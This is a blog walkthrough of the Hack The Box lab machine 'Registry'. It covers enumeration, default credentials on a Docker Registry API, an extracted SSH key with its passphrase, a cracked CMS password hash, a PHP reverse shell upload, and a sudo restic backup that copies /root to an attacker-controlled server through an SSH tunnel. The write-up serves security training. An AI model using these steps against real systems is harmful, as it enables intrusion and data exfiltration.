---
layout: post
title: "Registry: Hack The Box Writeup"
date: 2020-03-30 11:30
tags: [registry, hackthebox, docker, bolt, restic]
---
Welcome to my first Hack The Box walkthrough! In this writeup, we're going to take a look at [Registry][registry]. This is a "Hard" Linux machine as classified by the team at Hack The Box, and it took me a couple days to crack! Since finishing it, I received lots of requests for nudges/hints regarding the box, and so I figured making a walkthrough would be good for the community, and give me an excuse to do my first write-up. So let's begin!

# Foothold
As with any box, we begin with scanning and enumeration. My first command on any new box is the following nmap scan:

```
nmap -A -T4 -v -oN nmap -Pn -p- 10.10.10.159
```

Breaking the options down, we have:
 - -A: Enable OS detection, version detection, script scanning, and traceroute
 - -T4: Run at a higher speed template
 - -v: Be verbose, tell us if you find something as you find it.
 - -oN nmap: Output the results in normal format into a file called 'nmap'
 - -Pn: Treat the host as online even if it doesn't respond to ping
 - -p-: Enumerate all ports

 Looking at the results,

 ```
 kali@kali:~/htb/registry$ cat nmap 
# Nmap 7.80 scan initiated Sun Mar 29 22:19:54 2020 as: nmap -A -T4 -v -oN nmap -Pn -p- 10.10.10.159
Warning: 10.10.10.159 giving up on port because retransmission cap hit (6).
Nmap scan report for registry.htb (10.10.10.159)
Host is up (0.057s latency).
Not shown: 65511 closed ports
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp    open     http     nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp   open     ssl/http nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
|_SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
4734/tcp  filtered unknown
6319/tcp  filtered unknown
6683/tcp  filtered unknown
7616/tcp  filtered unknown
10309/tcp filtered unknown
12534/tcp filtered unknown
15534/tcp filtered unknown
16002/tcp filtered gsms
21890/tcp filtered unknown
22958/tcp filtered unknown
42710/tcp filtered unknown
48897/tcp filtered unknown
49580/tcp filtered unknown
53341/tcp filtered unknown
54913/tcp filtered unknown
55061/tcp filtered unknown
58965/tcp filtered unknown
60767/tcp filtered unknown
60961/tcp filtered unknown
62663/tcp filtered unknown
65460/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see port 22 (ssh), 80 & 443 (web) are open, as well as a bunch of other 'filtered' ports. We also see that there is an ssl certificate with the subject name `commonName=docker.registry.htb`.

Whenever I discover a box has a web port open, the first action is always to visit the website and see what it is!

![Web Page](/assets/img/registry/webpage.png)

Lame, just a plain old default nginx installation. Maybe there's other content on the server, you just have to know the URL? To do this, we begin directory busting. I personally prefer gobuster, and use it as follows:

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -o gobuster -x php -u http://10.10.10.159
```

Breaking down the options, we see:
 - -w /usr/share/wordlists/dirb/common.txt: Use this wordlist. If this fails to find something, my next resort is /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt and then /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 - -r: Follow redirects
 - -o gobuster: output the results into a file called 'gobuster'
 - -x php: Try adding the '.php' extension onto every url
 - -u: The base url to append to.

Looking at the results,

```
kali@kali:~/htb/registry$ cat gobuster 
/.bash_history (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/backup.php (Status: 200)
/index.html (Status: 200)
/install (Status: 200)
```

We find a `/backup.php` which is blank

![backup.php](/assets/img/registry/blankbackupphp.png)
We also find `/install` which seems to contain a bunch of random bytes.

![install](/assets/img/registry/install.png)

Since we've more or less come to a dead end, lets backtrack a bit and checkout that `docker.registry.htb` we saw in the nmap scan earlier.

Adding `10.10.10.159 docker.registry.htb` to our `/etc/hosts` file, we can navigate to the page and find the following.

![blankdocker](/assets/img/registry/dockerblank.png)
Great. Another blank page. Let's see if there's anything hidden with some more directory busting.

```
kali@kali:~/htb/registry$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -o docker-gobuster -x php -q -u http://docker.registry.htb/
/v2 (Status: 401)
```

Well that looks interesting. Let's take a look.

![v2](/assets/img/registry/v2.png)

It's asking for some basic authentication! Now, you could spin up Hydra to crack this, or you could be lucky like me and try admin:admin and get let in! Unfortunately, getting in reveals only a blank JSON viewer. After fumbling around for a while, I passed it to burp and saw an interesting response header to all of my requests.

```
docker-distribution-api-version: registry/2.0
```

A bit of googling revealed that this implies the website is the running Docker Registry API service! After doing a bit of research, I stumbled upon [this blog post][docker_blog] which detailed how this API could be exploited, by downloading all files available in the registry. Using the script the author made available [here][docker_blog_github], I was able to pull down the contents of the 'bolt-image' repo as shown below.

```
kali@kali:~/htb/registry$ python docker_image_fetch.py -u http://docker.registry.htb:80
{"repositories":["bolt-image"]}

http://docker.registry.htb:80/v2/_catalog

[+] List of Repositories:

bolt-image

Which repo would you like to download?:  bolt-image



[+] Available Tags:

latest

Which tag would you like to download?:  latest

Give a directory name:  docker
Now sit back and relax. I will download all the blobs for you in docker directory. 
Open the directory, unzip all the files and explore like a Boss. 

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b

[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee

[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c

[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7

[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791

[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4

[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0

[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a

[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797

[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
```

I then extracted all of the files to a tar folder with a bit of bash.

```
cd docker
mkdir tar
for filename in *.tar.gz; do tar -C tar -zxf $filename; done
```

The result of this is we get a (mostly) complete filesystem! After looking around, we find the following in the root directory.

```
kali@kali:~/htb/registry/docker/tar$ cat root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

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
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
kali@kali:~/htb/registry/docker/tar$ cat root/.ssh/config 
Host registry
  User bolt
  Port 22
  Hostname registry.htb
```

Sweet! It looks like we have our way into the system!
# User 1 - Bolt
In order to get the user, we need to ssh with the provided key. Unfortunately, this key is passphrase protected. Not to worry, as we can crack it using [JohnTheRipper][jtr] and it's many components. Simply convert the key into something john can crack, and then plug and play!

```
/usr/share/john/ssh2john.py bolt-ssh-key > uncracked
sudo john --wordlist=/usr/share/wordlists/rockyou.txt uncracked
```

... but it didn't find it. Maybe the password is hidden somewhere in all that stuff we pulled down! Having a look at root's bash history, we see lots of mentions for `/etc/profile.d/01-ssh.sh`. Investigating, we find

```
kali@kali:~/htb/registry/docker/tar$ cat etc/profile.d/01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

Bingo! We've found the password for bolt's ssh key. Plugging it in with ssh, we get into the system and hence get the user flag.

```
kali@kali:~/htb/registry$ ssh -i bolt-ssh-key bolt@10.10.10.159
Enter passphrase for key 'bolt-ssh-key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Mon Mar 30 05:08:39 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 40%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    165

  => There is 1 zombie process.
Last login: Mon Mar 30 04:54:02 2020 from 10.10.14.94
bolt@bolt:~$ ls
user.txt
bolt@bolt:~$ cat user.txt | wc -c
33
```

We can cat the user.txt, and it contains 32 characters (md5 hash) + a newline. I won't be showing the flag itself, rather that I have the permissions to show the flag.
# User 2 - www-data
After doing some enumeration and not finding much, I decided to look at what NGINX was serving in `/var/www/html/`.

```
bolt@bolt:~$ ls -lA /var/www/html/
total 20
-rw-r--r--  1 root     root       85 May 25  2019 backup.php
-rw-------  1 git      www-data    0 Oct  8 21:54 .bash_history
drwxrwxr-x 11 www-data www-data 4096 Oct 21 08:27 bolt
-rwxrwxr-x  1 www-data www-data  612 May  6  2019 index.html
-rw-r--r--  1 root     root      612 Oct 21 08:41 index.nginx-debian.html
drwxr-xr-x  2 root     root     4096 Sep 26  2019 install
```

We can see what that `backup.php` file was doing.

```
bolt@bolt:/var/www/html$ cat backup.php 
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

Looks dangerous. We'll come back to this later. We also notice a `bolt` directory which we didn't discover before. Checking out the website and the source code, it appears to be a CMS (which Google verifies).

![bolt](/assets/img/registry/bolt.png)

When trying to access the admin panel, we are faced with a login.

![boltlogin](/assets/img/registry/boltlogin.png)

So we need to find some login credentials. Looking at the app's config in `/var/www/html/bolt/app/config/config.yml`, we see that it's using a SQLITE database. Digging around, we found `/var/www/html/bolt/app/database/bolt.db`, and inside, we find `$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK` as the hash for `admin`.

Passing these to JohnTheRipper, we quickly crack the password as 'strawberry'. Sure enough, we can now login to the Bolt admin panel!

![boltloggedin](/assets/img/registry/boltloggedin.png)

Moving around the site, we find a file upload page. The natural next step is trying to upload a reverse shell, but when we do we see that there is some kind of whitelist in place.

![whitelist](/assets/img/registry/whitelist.png)

Looking through the site's config, we see that we can modify the `accept_file_types` to include php, even though the comment says we cannot.

![config](/assets/img/registry/config.png)

Now that we can upload PHP files, let's try uploading that reverse shell. The reverse shell I'm using is [this one][rev] by pentestmonkey. ***Note:*** *You need to be really quick in uploading your PHP file after changing the config.yml file, as it is reset back to it's original contents very quickly. I pulled my hair out for a day over this!*

![uploadsuccess](/assets/img/registry/uploadsuccess.png)

However, when we execute the file, we don't get a shell back... To figure out why this might be, let's just verify we can get a connection back from the box to our kali machine. To do this, I try connecting a simple nc from the my kali machine to the target machine, but unfortunately we got no connection.

![noconnection](/assets/img/registry/noconnection.png)

So it looks like we can't get a connection back to our machine. To get around this, we can setup our shell listener within our Bolt SSH session, that way we can send the reverse shell to localhost and hence, the connection never leaves the machine! Following this logic, we get our shell as www-data.

```
bolt@bolt:~$ nc -lnvp 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from 127.0.0.1 46400 received!
Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:06:25 up  2:49,  1 user,  load average: 0.14, 0.09, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
bolt     pts/0    10.10.16.244     07:00    2:49   0.00s  0.00s nc -lnvp 12345
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

# Root
Now we're on the final stretch, let's get root.

Firstly, lets upgrade our basic PHP shell to an interactive shell.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bolt:/$ 
```

Ah, much nicer. Checking our priveleges, we see we can run a command as root without a password.

```
www-data@bolt:/$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

So it looks like we have to exploit this "restic" program. Doing some research, we see that [Restic][restic] is a backup program. Reading the [documentation][init-and-rest] on how to initialize a repo of our own that we can back up to, we see the same `restic backup -r rest` command that we can run as root! Reading this section, we see this is to do with setting up a [Rest Server][rest-server].

Putting the pieces together, in theory our exploit will look something like this.

`sudo /usr/bin/restic backup -r rest://ourKaliMachine:8000/ /root`

In words, this will backup the root directory to a rest server that we host and control on our Kali attack machine. Since it runs with root priveleges, it can read and therefore copy the contents of the root directory! So, let's do it.

First, we need to install and initialize the [Rest Server][rest-server] and [Restic Repository][init-and-rest].

```
kali@kali:~$ sudo apt install restic
kali@kali:~$ mkdir -p /tmp/restic
kali@kali:~$ restic init -r /tmp/restic
kali@kali:~$ cd /opt
kali@kali:/opt$ wget -q https://github.com/restic/rest-server/releases/download/v0.9.7/rest-server-0.9.7-linux-amd64.gz
kali@kali:/opt$ gunzip rest-server-0.9.7-linux-amd64.gz
kali@kali:/opt$ chmod +x rest-server-0.9.7-linux-amd64
kali@kali:/opt$ ./rest-server-0.9.7-linux-amd64 --path /tmp/restic --debug
```

Now that we have a rest-server up and running on port 8000, we just need to do the backup! But first, we need to find a way to get the backup back to our machine, since we found out before that we can't get a connection back to our machine. One way to do this, is with **tunnels**.

```
kali@kali:~/htb/registry$ ssh -i bolt-ssh-key -R 8001:127.0.0.1:8000 bolt@10.10.10.159
```

This sets up a tunnel to forward all traffic to port 8001 on the remote machine to port 8000 on our Kali machine. So let's finally root this machine! First, catch a www-data shell in our new Bolt SSH session **with** port forwarding setup. Next, upgrade our shell again *(this is important so that we can enter in the password for our repository)*.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Backup the repository to port 8001, so that it is forwarded to our Kali machine.

```
www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8001/ /root
```

Finally, restore the backup and get that flag!

```
kali@kali:/tmp/restic$ restic restore latest -r /tmp/restic --target ./restore
kali@kali:/tmp/restic$ cat restore/root/root.txt | wc -c
33
```

Donezo.
# Summary
Well, that was a ride! We exploited a bunch of services, including the Docker Registry API, Bolt CMS and Restic. Although the machine was quite complex, I hope my walkthrough was easy enough to follow. This is my first walkthrough, so if you have any feedback please leave it in a comment below!

If this walkthrough helped you, feel free to /respect me on Hack The Box :)

<a href="https://www.hackthebox.eu/home/users/profile/119118"><script src="https://www.hackthebox.eu/badge/119119"></script></a>

[docker_blog]: https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
[docker_blog_github]: https://github.com/NotSoSecure/docker_fetch/
[registry]: https://www.hackthebox.eu/home/machines/profile/213
[rev]: https://github.com/pentestmonkey/php-reverse-shell
[restic]: https://restic.net/
[rest-server]: https://github.com/restic/rest-server
[init-and-rest]: https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html
[jtr]: https://github.com/magnumripper/JohnTheRipper